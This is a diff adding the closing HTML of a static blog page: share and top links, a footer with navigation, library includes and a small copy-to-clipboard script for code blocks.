+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2020
+    X1do0
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
